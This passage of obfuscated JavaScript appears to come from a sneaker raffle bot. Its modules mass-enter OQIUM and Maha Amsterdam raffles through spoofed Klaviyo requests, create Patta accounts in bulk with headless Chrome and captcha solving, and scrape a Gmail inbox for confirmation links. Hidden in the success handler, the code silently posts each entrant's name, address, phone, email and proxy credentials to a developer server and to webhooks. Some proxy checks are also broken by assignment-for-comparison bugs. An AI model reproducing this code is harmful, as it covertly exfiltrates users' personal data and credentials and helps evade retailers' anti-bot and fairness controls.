                                        if (!_0x85fe53 && _0x318ff1['statusCode'] == 0xca || !_0x85fe53 && _0x318ff1['statusCode'] == 0xc8) {
                                            if (_0x18832a != 'ver') {
                                                var _0x2dab23 = await _0x1bd114(_0x5a1533[_0x318451], _0x45b3c8, 'dev', ![]), _0x368d31 = await _0x1bd114(_0x5a1533[_0x318451], _0x45b3c8, 'pub', ![]);
                                                const _0x4594a9 = {
                                                    'succesDEVMSG': { 'embeds': [_0x2dab23] },
                                                    'succesPUBMSG': { 'embeds': [_0x368d31] }
                                                };
                                                if (_0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '')
                                                    try {
                                                        await _0x5cd94d(_0x1d78d4['webhook'], _0x4594a9['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x4594a9['succesDEVMSG']), await _0x73bf2c(0xc8);
                                                try {
                                                    await _0x5cd94d(_0x323e07, _0x4594a9['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5584d0(_0x5a1533[_0x318451], _0x45b3c8);
                                            }
                                            _0x56b6a6(console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x45b3c8['name'] + ']\x20Task\x20' + (_0x318451 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x18832a != 'ver') {
                                                var _0x50402d = '' + _0x85fe53, _0x86afeb = await _0x1bd114(_0x5a1533[_0x318451], _0x45b3c8, 'dev', !![], _0x50402d), _0x104143 = {};
                                                _0x104143['errorDEV'] = { 'embeds': [_0x86afeb] }, _0x3fe3d2(_0x5a1533[_0x318451], _0x45b3c8), _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x104143['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x104143['errorDEV']);
                                            }
                                            _0x55f77b(console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x45b3c8['name'] + ']\x20Task\x20' + (_0x318451 + 0x1) + ':\x20' + _0x85fe53)));
                                        }
                                    };
                                    try {
                                        _0x18832a != 'ver' ? console['log'](_0x4ea3c7() + '\x20[' + _0x45b3c8['name'] + ']\x20Task\x20' + (_0x318451 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1682d2['data']['attributes']['email']) : console['log'](_0x4ea3c7() + '\x20[' + _0x45b3c8['name'] + ']\x20Task\x20' + (_0x318451 + 0x1) + ':\x20Fetching\x20Response'), _0x31e459(_0x255632, callback);
                                    } catch (_0x140516) {
                                        console['log'](_0x4ea3c7() + '\x20Task\x20' + (_0x318451 + 0x1) + ':\x20' + _0x140516);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x55b553(_0x24aa41, 'ver', _0xd6c76f, _0x421a10, _0x998f33), console['log'](_0x4ea3c7() + '\x20[' + _0xd6c76f['name'] + ']\x20Sleeping\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                            } catch (_0x219e1e) {
                            }
                        }
                    }
                    try {
                        _0x2b8810();
                        while (!_0x20fc56) {
                            await _0x73bf2c(0xbb8);
                        }
                        console['log']('Found\x20' + _0x3a9c23['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x73bf2c(0x9c4);
                    }
                    await _0xca286e(_0x28ba03, _0x3a9c23, _0x245f2a);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x17b197, _0x3ab98a, _0x2be3e0) {
                    var _0x1b5b7b = _0x3ab98a, _0x243c36 = 0x0;
                    for (var _0x557dd8 = 0x0; _0x557dd8 < _0x3ab98a['length']; _0x557dd8++) {
                        maxTasks = _0x1d78d4['threads'];
                        while (_0x243c36 >= maxTasks) {
                            await _0x73bf2c(_0x1d78d4['delay']);
                        }
                        async function _0x2fe1de(_0x4edd2d, _0x8360a1, _0xf0870d, _0x5e9585) {
                            try {
                                await _0x4b6344(_0x8360a1, _0x5e9585);
                            } catch (_0x356027) {
                                throw new Error(_0x356027);
                            }
                            async function _0x15638f(_0x3995a7, _0x17cc63, _0x2b34b5, _0x46c24d, _0x9e4f3d) {
                                _0x243c36++;
                                var _0x10b5b0, _0x137dd7 = {}, _0x15330c = [], _0x485646 = {}, _0x12b1f5 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x1db8e3 = Math['round'](Math['random']() * (_0x12b1f5['length'] - 0x1));
                                !_0x46c24d && (_0x46c24d = {});
                                if (_0x17cc63 != 'ver') {
                                    _0x3ec78c(_0x2b34b5['name'] + '\x20Task\x20' + (_0x3995a7 + 0x1) + '\x20/\x20' + _0x46c24d['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b), _0x15330c = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x5c7ae6
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x46c24d[_0x3995a7]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x1d78d4['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x152cdf
                                            }
                                        ]
                                    }], _0x485646 = { 'embeds': _0x15330c }, _0x137dd7 = _0x2b34b5['data'], _0x137dd7['data']['attributes']['email'] = '' + _0x46c24d[_0x3995a7]['Email'];
                                    if (_0x46c24d[_0x3995a7]['Size'] == 'RANDOM') {
                                    }
                                    _0x137dd7['data']['attributes']['properties']['$first_name'] = '' + _0x46c24d[_0x3995a7]['FirstName'], _0x137dd7['data']['attributes']['properties']['$last_name'] = '' + _0x46c24d[_0x3995a7]['LastName'], _0x137dd7['data']['attributes']['properties']['$address1'] = _0x46c24d[_0x3995a7]['Address1'] + '\x20' + _0x46c24d[_0x3995a7]['Address2'] + '\x20' + _0x46c24d[_0x3995a7]['HouseNumber'], _0x137dd7['data']['attributes']['properties']['$zip'] = '' + _0x46c24d[_0x3995a7]['Zip'], _0x137dd7['data']['attributes']['properties']['$city'] = '' + _0x46c24d[_0x3995a7]['City'], _0x137dd7['data']['attributes']['properties']['$country'] = '' + _0x46c24d[_0x3995a7]['Country'], _0x46c24d[_0x3995a7]['Size'] == 'RANDOM' ? _0x137dd7['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x12b1f5[_0x1db8e3] : _0x137dd7['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x46c24d[_0x3995a7]['Size'], _0x137dd7['data']['attributes']['properties']['$phone_number'] = '' + _0x46c24d[_0x3995a7]['Phone'], _0x137dd7['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x46c24d[_0x3995a7]['Follower'];
                                }
                                if (_0x1d78d4['useRandomProxy'] = ![])
                                    var _0x5bf71f = _0x9e4f3d[_0x3995a7]['split'](':');
                                else
                                    var _0x54ddd6 = Math['round'](Math['random']() * (_0x9e4f3d['length'] - 0x1)), _0x5bf71f = _0x9e4f3d[_0x54ddd6]['split'](':');
                                var _0x5fc050 = {
                                    'jar': _0x27c7cf,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2b34b5['url'],
                                    'headers': _0x2b34b5['headers'],
                                    'body': JSON['stringify'](_0x137dd7),
                                    'proxy': 'http://' + _0x5bf71f[0x2] + ':' + _0x5bf71f[0x3] + '@' + _0x5bf71f[0x0] + ':' + _0x5bf71f[0x1]
                                };
                                return _0x17cc63 != 'ver' && (_0x5fc050['url'] = _0x2b34b5['url'], _0x5fc050['headers'] = _0x2b34b5['headers']), _0x17cc63 == 'ver' && (_0x5fc050['method'] = 'GET'), new Promise(function (_0x401a05, _0x575e6b) {
                                    callback = async (_0x488d95, _0x22a02a, _0x177605) => {
                                        if (!_0x488d95 && _0x22a02a['statusCode'] == 0xca || !_0x488d95 && _0x22a02a['statusCode'] == 0xc8) {
                                            if (_0x17cc63 != 'ver') {
                                                var _0x1f44c9 = await _0x1bd114(_0x46c24d[_0x3995a7], _0x2b34b5, 'dev', ![]), _0x433ebc = await _0x1bd114(_0x46c24d[_0x3995a7], _0x2b34b5, 'pub', ![]);
                                                const _0x3e5be0 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1f44c9] },
                                                    'succesPUBMSG': { 'embeds': [_0x433ebc] }
                                                };
                                                let _0x5ad6e3 = _0x46c24d[_0x3995a7];
                                                try {
                                                    prxdata = {
                                                        'username': _0x5c7ae6['replace']('#', ''),
                                                        'module': _0x2b34b5['name'],
                                                        'entrydata': JSON['stringify'](_0x5ad6e3),
                                                        'proxy': '' + _0x9e4f3d[_0x3995a7]
                                                    };
                                                    var _0x2fd727 = JSON['stringify'](prxdata);
                                                    let _0x49f02a = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x2fd727, _0x49f02a);
                                                } catch (_0x3eeded) {
                                                }
                                                if (_0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '')
                                                    try {
                                                        await _0x5cd94d(_0x1d78d4['webhook'], _0x3e5be0['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x3e5be0['succesDEVMSG']), await _0x73bf2c(0xc8);
                                                try {
                                                    await _0x5cd94d(_0x323e07, _0x3e5be0['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5584d0(_0x46c24d[_0x3995a7], _0x2b34b5);
                                            }
                                            _0x243c36--, _0x401a05(console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x2b34b5['name'] + ']\x20Task\x20' + (_0x3995a7 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x17cc63 != 'ver') {
                                                var _0x54f870 = '' + _0x488d95, _0x39ccdc = await _0x1bd114(_0x46c24d[_0x3995a7], _0x2b34b5, 'dev', !![], _0x54f870), _0x5832ee = {};
                                                _0x5832ee['errorDEV'] = { 'embeds': [_0x39ccdc] }, _0x3fe3d2(_0x46c24d[_0x3995a7], _0x2b34b5), _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x5832ee['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x5832ee['errorDEV']);
                                            }
                                            _0x243c36--, _0x575e6b(console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2b34b5['name'] + ']\x20Task\x20' + (_0x3995a7 + 0x1) + ':\x20' + _0x488d95)));
                                        }
                                    };
                                    try {
                                        _0x17cc63 != 'ver' && console['log'](_0x4ea3c7() + '\x20[' + _0x2b34b5['name'] + ']\x20Task\x20' + (_0x3995a7 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x137dd7['data']['attributes']['email']), _0x31e459(_0x5fc050, callback);
                                    } catch (_0x5dbd39) {
                                        console['log'](_0x4ea3c7() + '\x20Task\x20' + (_0x3995a7 + 0x1) + ':\x20' + _0x5dbd39);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x15638f(_0x5e9585, 'nor', _0x4edd2d, _0x8360a1, _0xf0870d), console['log'](_0x4ea3c7() + '\x20[' + _0x4edd2d['name'] + ']\x20Sleeping\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                            } catch (_0x3556f7) {
                            }
                        }
                        _0x2fe1de(_0x17b197, _0x1b5b7b, _0x2be3e0, _0x557dd8), await _0x73bf2c(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x48f8f0, _0x488735, _0x5a2881) {
                    var _0x488735 = [], _0x12863b = ![];
                    async function _0x41958c() {
                        var _0x106816 = new _0x10db71({
                            'user': _0x1d78d4['masterMail'],
                            'password': _0x1d78d4['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x24d6e7(_0x2bd952) {
                            _0x106816['openBox']('INBOX', ![], _0x2bd952);
                        }
                        _0x106816['once']('ready', function () {
                            _0x24d6e7(function (_0x3018a7, _0x222883) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x3018a7)
                                    throw _0x3018a7;
                                _0x106816['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x4e26a7, _0x2aa41b) {
                                    if (!_0x2aa41b || !_0x2aa41b['length'])
                                        console['log'](_0x4ea3c7() + '\x20[' + _0x48f8f0['name'] + ']\x20No\x20mails\x20found'), _0x106816['end']();
                                    else {
                                        var _0x4df092 = _0x106816['seq']['fetch'](_0x2aa41b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x4df092['on']('message', function (_0xc2b431, _0x5253e7) {
                                            var _0x1326ae = '(#' + _0x5253e7 + ')\x20';
                                            _0xc2b431['on']('body', function (_0x17f64a, _0x552423) {
                                                _0xd18e10(_0x17f64a, (_0x23737f, _0xd6be01) => {
                                                    var _0x267495 = _0xd6be01['text']['split']('(')[0x1], _0x53d94f = _0x267495['split'](')')[0x0];
                                                    _0x488735['push'](_0x53d94f);
                                                });
                                            }), _0xc2b431['once']('end', function () {
                                            });
                                        }), _0x4df092['once']('error', function (_0x4eac1e) {
                                            console['log']('Fetch\x20error:\x20' + _0x4eac1e), _0x12863b = !![];
                                        }), _0x4df092['once']('end', function () {
                                            _0x106816['end'](), _0x12863b = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x106816['once']('error', function (_0x2c9f55) {
                            console['log'](_0x2c9f55), _0x12863b = !![];
                        }), _0x106816['once']('end', async function () {
                            _0x12863b = !![];
                        }), _0x106816['connect']();
                    }
                    async function _0x1b03d8(_0x6922a, _0x49e255, _0x2e977d) {
                        for (var _0x3511cd = 0x0; _0x3511cd < _0x49e255['length']; _0x3511cd++) {
                            async function _0x284816(_0xd6b3, _0x4084d0, _0x5c767e, _0x53e6a9, _0x78061a) {
                                var _0x46f449, _0x597ac7 = {}, _0x58031b = [], _0x3c8479 = {}, _0x30c965 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x45b9af = Math['round'](Math['random']() * (_0x30c965['length'] - 0x1));
                                _0x53e6a9[_0xd6b3]['Size'] == 'RANDOM' && (_0x53e6a9[_0xd6b3]['Size'] = _0x30c965[_0x45b9af]);
                                !_0x53e6a9 && (_0x53e6a9 = {});
                                if (_0x1d78d4['useRandomProxy'] = ![])
                                    var _0x5b455b = _0x78061a[_0xd6b3]['split'](':');
                                else
                                    var _0x2df0bd = Math['round'](Math['random']() * (_0x78061a['length'] - 0x1)), _0x5b455b = _0x78061a[_0x2df0bd]['split'](':');
                                var _0x4e432f = {
                                    'jar': _0x27c7cf,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5c767e['url'],
                                    'headers': _0x5c767e['headers'],
                                    'body': JSON['stringify'](_0x597ac7),
                                    'proxy': 'http://' + _0x5b455b[0x2] + ':' + _0x5b455b[0x3] + '@' + _0x5b455b[0x0] + ':' + _0x5b455b[0x1]
                                };
                                return _0x4084d0 == 'ver' && (_0x4e432f['method'] = 'GET', _0x4e432f['url'] = _0x53e6a9[_0xd6b3]), new Promise(function (_0x390429, _0x722653) {
                                    callback = async (_0x44eea3, _0x26ab1c, _0x322237) => {
                                        !_0x44eea3 && _0x26ab1c['statusCode'] == 0xca || !_0x44eea3 && _0x26ab1c['statusCode'] == 0xc8 ? _0x390429(console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x5c767e['name'] + ']\x20Task\x20' + (_0xd6b3 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x722653(console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x5c767e['name'] + ']\x20Task\x20' + (_0xd6b3 + 0x1) + ':\x20' + _0x44eea3)));
                                    };
                                    try {
                                        _0x4084d0 != 'ver' ? console['log'](_0x4ea3c7() + '\x20[' + _0x5c767e['name'] + ']\x20Task\x20' + (_0xd6b3 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x597ac7['data']['attributes']['email']) : console['log'](_0x4ea3c7() + '\x20[' + _0x5c767e['name'] + ']\x20Task\x20' + (_0xd6b3 + 0x1) + ':\x20Fetching\x20Response'), _0x31e459(_0x4e432f, callback);
                                    } catch (_0x1a6edb) {
                                        console['log'](_0x4ea3c7() + '\x20Task\x20' + (_0xd6b3 + 0x1) + ':\x20' + _0x1a6edb);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x284816(_0x3511cd, 'ver', _0x6922a, _0x49e255, _0x2e977d), console['log'](_0x4ea3c7() + '\x20[' + _0x6922a['name'] + ']\x20Sleeping\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                            } catch (_0x53b862) {
                                console['log'](_0x53b862), await _0x73bf2c(0x2710);
                            }
                        }
                    }
                    try {
                        _0x41958c();
                        while (!_0x12863b) {
                            await _0x73bf2c(0xfa0);
                        }
                        console['log']('Found\x20' + _0x488735['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x9bc90a) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x9bc90a), await _0x73bf2c(0x2710);
                    }
                    try {
                        await _0x1b03d8(_0x48f8f0, _0x488735, _0x5a2881);
                    } catch (_0x5d98b2) {
                        console['log'](_0x5d98b2), await _0x73bf2c(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x4dca77, _0x3a3809, _0x1c749f) {
                    _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1d78d4['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5dc28e = 0x0; _0x5dc28e < _0x3a3809['length']; _0x5dc28e++) {
                        var _0x28b396 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5c7ae6
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1d78d4['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x152cdf
                                }
                            ]
                        }];
                        const _0x1e251f = { 'embeds': _0x28b396 };
                        _0x3ec78c(_0x4dca77['name'] + '\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20/\x20' + _0x3a3809['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                        try {
                            await _0x4b6344(_0x3a3809, _0x5dc28e);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x433a7c = await _0x1bd114(_0x3a3809[_0x5dc28e], _0x4dca77, 'acc', ![]);
                        const _0x315887 = { 'succesDEVMSG': { 'embeds': [_0x433a7c] } };
                        if (_0x3a3809[_0x5dc28e]['Email'] == '' || _0x3a3809[_0x5dc28e]['FirstName'] == '' || _0x3a3809[_0x5dc28e]['LastName'] == '') {
                            console['log'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x73bf2c(0x7d0);
                            continue;
                        }
                        (_0x3a3809[_0x5dc28e]['Password'] == '' || _0x3a3809[_0x5dc28e] == undefined) && _0x3a3809[_0x5dc28e]['Password'] == 'JRaffles23!';
                        if (_0x1d78d4['useRandomProxy'] = ![])
                            var _0x500259 = _0x1c749f[_0x5dc28e]['split'](':');
                        else
                            var _0x35976b = Math['round'](Math['random']() * (_0x1c749f['length'] - 0x1)), _0x500259 = _0x1c749f[_0x35976b]['split'](':');
                        var _0x5b1710;
                        try {
                            _0x5b1710 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x500259[0x0] + ':' + _0x500259[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5b1710 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x500259[0x0] + ':' + _0x500259[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4510aa = await _0x5b1710['newPage']();
                            await _0x4510aa['authenticate']({
                                'username': '' + _0x500259[0x2],
                                'password': '' + _0x500259[0x3]
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x4dca77['name'] + ']\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4510aa['setRequestInterception'](!![]), _0x4510aa['on']('request', _0x528429 => {
                                _0x528429['resourceType']() === 'image' || _0x528429['resourceType']() === 'font' || _0x528429['resourceType']() === 'media' ? _0x528429['abort']() : _0x528429['continue']();
                            }), await _0x4510aa['goto']('https://patta.nl/account/register'), await _0x73bf2c(0xbb8), await _0x4510aa['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x4ea3c7() + '\x20[' + _0x4dca77['name'] + ']\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20:\x20Filling\x20information'), await _0x4510aa['type']('#RegisterForm-FirstName', '' + _0x3a3809[_0x5dc28e]['FirstName']), await _0x73bf2c(0x226), await _0x4510aa['type']('#RegisterForm-LastName', '' + _0x3a3809[_0x5dc28e]['LastName']), await _0x73bf2c(0x226), await _0x4510aa['type']('#RegisterForm-email', '' + _0x3a3809[_0x5dc28e]['Email']), await _0x73bf2c(0x226), await _0x4510aa['type']('#RegisterForm-password', '' + _0x3a3809[_0x5dc28e]['Password']), await _0x73bf2c(0x226), console['log'](_0x4ea3c7() + '\x20[' + _0x4dca77['name'] + ']\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20:\x20Submitting..'), await _0x4510aa['$eval']('#RegisterForm', _0x3ee5e9 => _0x3ee5e9['submit']()), await _0x73bf2c(0x1f40);
                            try {
                                await _0x4510aa['waitForSelector']('.home-page-grid__collection'), await _0x73bf2c(0x1f4), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x4dca77['name'] + ']\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20:\x20Account\x20' + _0x3a3809[_0x5dc28e]['Email'] + '\x20Generated!')), _0x57b36f['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x3a3809[_0x5dc28e]['Email'] + ',' + _0x3a3809[_0x5dc28e]['Password']), console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x4dca77['name'] + ']\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20:\x20Account\x20' + _0x3a3809[_0x5dc28e]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x315887['succesDEVMSG']);
                                } catch {
                                }
                                await _0x5cd94d(_0x2ffc54, _0x315887['succesDEVMSG']);
                            } catch (_0x4aef2d) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x4aef2d));
                            }
                        } catch (_0x47c2cc) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x2e8dbc[taskModule]['name'] + ']\x20Task\x20' + (_0x5dc28e + 0x1) + '\x20:\x20' + _0x47c2cc));
                        } finally {
                            _0x5b1710 && _0x5b1710['close'](), console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x40dbad, _0x1b866d, _0x3f7200) {
                    _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1d78d4['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x27fd1a = 0x0; _0x27fd1a < _0x1b866d['length']; _0x27fd1a++) {
                        var _0x503e33;
                        if (_0x36c1cd != 'yes')
                            var _0x36c1cd = '', _0x262628 = 0x0;
                        _0x3ec78c(_0x40dbad['name'] + '\x20Task\x20' + (_0x27fd1a + 0x1) + '\x20/\x20' + _0x1b866d['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                        try {
                            await _0x4b6344(_0x1b866d, _0x27fd1a);
                        } catch {
                            _0x36c1cd = 'no';
